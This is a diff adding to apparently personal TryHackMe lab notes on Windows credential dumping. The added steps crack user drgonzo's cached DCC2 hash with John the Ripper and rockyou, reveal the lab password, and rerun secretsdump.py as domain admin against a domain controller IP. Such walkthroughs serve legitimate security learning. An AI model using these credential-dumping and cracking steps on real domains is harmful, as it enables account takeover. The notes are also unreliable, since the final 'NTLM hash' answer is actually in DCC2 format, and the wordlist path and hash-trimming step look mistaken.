@@ -53,4 +53,15 @@ Learn how credentials are stored, cached, and exposed in Windows and Active Dire
     - `secretsdump.py WRK/Administrator:N3w34829DJdd?1@<target ip> -output local_dump` will dump the local hashes of the Domain Controller
 - drgonzo's password hash information is: `TRYHACKME.LOC/drgonzo:$DCC2$10240#drgonzo#d0dc1647e45cf7364ecec3c7740fce0f:`
 - Crack using *hashcat* or *johntheripper*
-    - 
+    - Shorten the hash to just the password
+        - `:$DCC2$10240#drgonzo#d0dc1647e45cf7364ecec3c7740fce0f:`
+    - `john --format=mscash2 hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar` to use johntheripper with the *rockyou* wordlist, specifying the *mscash2* format
+
+> drgonzo's password is **lasvegas1**
+
+### What is the domain Administrators NTLM hash?
+
+- Use the credentials for drgonzo to rerun *secretsdump.py* as domain admin
+    - `secretsdump.py TRYHACKME/drgonzo:lasvegas1@10.220.10.10 -just-dc -output dc_dump`
+
+> The domain Administrator's NTLM hash is **:$DCC2$10240#Administrator#ea671e1143604bb87c6d48f6b5475c08:**
